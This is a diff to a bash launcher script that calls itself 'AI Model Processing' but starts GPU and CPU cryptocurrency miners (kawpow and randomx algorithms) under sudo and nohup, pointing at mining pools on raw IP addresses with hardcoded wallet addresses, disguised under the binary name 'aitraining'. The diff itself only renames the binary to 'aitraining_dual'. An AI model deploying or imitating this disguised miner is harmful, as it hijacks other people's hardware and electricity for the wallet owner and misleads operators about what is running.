@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- STOP OLD PROCESSES ---
-sudo pkill -f aitraining 2>/dev/null
+sudo pkill -f aitraining_dual 2>/dev/null
 sudo pkill -f monitor_system 2>/dev/null
 sleep 2
 
@@ -11,7 +11,7 @@ echo "=== Starting AI Model Processing ==="
 
 # --- GPU PROCESS ---
 nohup bash -c "
-sudo ./aitraining \
+sudo ./aitraining_dual \
     --algorithm kawpow \
     --pool 74.220.25.74:7845 \
     --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
@@ -28,7 +28,7 @@ sudo ./aitraining \
 
 # --- CPU PROCESS ---
 nohup bash -c "
-sudo ./aitraining \
+sudo ./aitraining_dual \
     --algorithm randomx \
     --pool 51.222.200.133:10343 \
     --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
@@ -47,7 +47,7 @@ nohup bash -c "
 while true; do
     echo -e '\n=== \$(date) System Status ===' >> ./logs/monitor.log
     echo 'Active Processes:' >> ./logs/monitor.log
-    ps aux | grep aitraining | grep -v grep >> ./logs/monitor.log
+    ps aux | grep aitraining_dual | grep -v grep >> ./logs/monitor.log
     echo 'GPU Status:' >> ./logs/monitor.log
     nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader >> ./logs/monitor.log 2>/dev/null
     echo '---' >> ./logs/monitor.log
@@ -66,9 +66,9 @@ echo "🌐 API Endpoints:"
 echo "   GPU Stats: http://127.0.0.1:21550/stats"
 echo "   CPU Stats: http://127.0.0.1:21551/stats"
 echo ""
-echo "🔍 Check processes: ps aux | grep aitraining"
+echo "🔍 Check processes: ps aux | grep aitraining_dual"
 echo "📈 Real-time logs: tail -f ./logs/*.log"
-echo "🛑 Stop processing: sudo pkill -f aitraining && sudo pkill -f monitor_system"\
+echo "🛑 Stop processing: sudo pkill -f aitraining_dual && sudo pkill -f monitor_system"\
 
 
 |||||||||||||||||||
